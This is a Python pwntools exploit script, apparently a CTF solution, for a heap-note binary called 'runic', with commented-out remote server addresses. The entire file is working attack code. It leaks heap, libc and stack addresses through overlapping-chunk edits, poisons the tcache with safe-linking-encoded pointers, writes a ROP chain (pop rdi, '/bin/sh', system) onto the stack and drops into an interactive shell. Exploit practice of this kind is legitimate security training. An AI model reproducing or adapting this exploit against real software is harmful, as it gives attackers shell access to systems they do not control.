from pwn import * 

context.terminal = ['terminator','-e']

null_name = '\x01\x00\x01'
# 161.35.168.118:31503
# 104.248.169.117:32003
# 167.71.143.44:32695
#p = remote("167.71.143.44",32695)
p = process("./runic")

gs = """
    b * delete

"""
pid = gdb.attach(p,gdbscript=gs)

def create(name,length,contents):
    p.sendlineafter(b"Action: \n", b'1')
    p.sendafter(b'\n',name)
    p.sendafter(b'\n',length)
    p.sendafter(b'\n',contents)

def edit(name_old,name_new,contents_new):
    p.sendlineafter(b"Action: \n", b'3')
    p.sendafter(b'\n',name_old)
    p.sendafter(b'\n',name_new)
    p.sendafter(b'\n',contents_new)

def delete(name):
    p.sendlineafter(b"Action: \n", b'2')
    p.sendafter(b'\n',name)

def view_(name):
    import time
    time.sleep(3)
    p.sendlineafter(b"Action: \n",b'4')
    p.sendafter(b'\n',name)



def padd(x):
    return x.ljust(8,b'\x00')

#=================LEAK HEAP=================

create(padd(b'\x05'),'15','BBBBBBBB')
create(padd(b'\x0b'),'8','FFFFFFFF')
create(padd(b'\x01'),'50','CCCCCCCC')
# import time
# time.sleep(3)
delete(padd(b'\x0b'))

edit(padd(b'\x05'),padd(b'\x01\x00\x05'),'X'*24)
view_(padd(b'\x06'))

p.recvuntil(b'X'*24)
leak = u64(p.recvline().replace(b'\n',b'').ljust(8,b'\x00')) << 12
print('leak heap',hex(leak))


#=================LEAK LIBC=================

# padding za fake chunk
for i in range(15,30):
    create(padd(int.to_bytes(i,1,'little')), '96',b'R'*24 + b'\x00'*8 + p64(0x41))


edit(padd(b'\x06'),padd(b'\x01\x00\x06'),b'BBBBBBBB'+b'\x00'*8+p64(0x501))

create(padd(int.to_bytes(31,1,'little')), '8',b'H'*8)

delete(padd(b'\x1f'))

edit(padd(b'\x07'),padd(b'\x01\x00\x07'),'X'*24)

view_(padd(b'\x08'))

p.recvuntil(b'X'*24)
leak_libc = u64(p.recvline().replace(b'\n',b'').ljust(8,b'\x00'))
libc_base = leak_libc -0x1f2cc0

print('leak_libc ',hex(libc_base))

#=================LEAK STACK=================

edit(padd(b'\x08'),padd(b'\x01\x00\x08'),b'BBBBBBBB'+b'\x00'*8+p64(0x501))

delete(padd(b'\x13'))
delete(padd(b'\x14'))
delete(padd(b'\x0f'))


create(padd(int.to_bytes(33,1,'little')), '64',b'T'*8)
kjer_smo = leak + 0x330

kje_bi_radi_bli = leak_libc + 0x81f0
ftakni_ga_not = (kjer_smo >> 12 ^ kje_bi_radi_bli)

create(padd(int.to_bytes(34,1,'little')), '64',b'T'*8 + b'\x00'*8+p64(0x71)+ p64(ftakni_ga_not))
create(padd(int.to_bytes(35,1,'little')), '96',b'K'*8)
create(padd(int.to_bytes(36,1,'little')), '96',b'I'*8)

view_(padd(b'\x24'))

p.recvuntil(b'I'*8)
leak_stack = u64(p.recvline().replace(b'\n',b'').ljust(8,b'\x00'))
print('leak_stack ',hex(leak_stack))

#=================OVERWRITE STACK TO ROP=================
print("Trying to fork /bin/sh")
kjer_smo = leak + 0x3a0

kje_bi_radi_bli = leak_stack -0x158
ftakni_ga_not = (kjer_smo >> 12 ^ kje_bi_radi_bli)



delete(padd(b'\x12'))
delete(padd(b'\x11'))
delete(padd(b'\x10'))

create(padd(int.to_bytes(37,1,'little')), '74',b'U'*0x28 + b'\x00'* 8 + p64(0x71)  +p64(ftakni_ga_not) )

pop_rdi_ret = libc_base +0x000000000002daa2
ret = libc_base + 0x000000000002d446
system = libc_base + 0x00000000004e320
bin_sh = libc_base + 0x1b4689


rop = p64(pop_rdi_ret)
rop += p64(bin_sh)
rop += p64(system)


create(padd(int.to_bytes(38,1,'little')), '96',b"N" *8 )
create(padd(int.to_bytes(40,1,'little')), '96',rop )
print("SUCCESS!")
print("Enjoy your shell :)")

p.interactive()

    
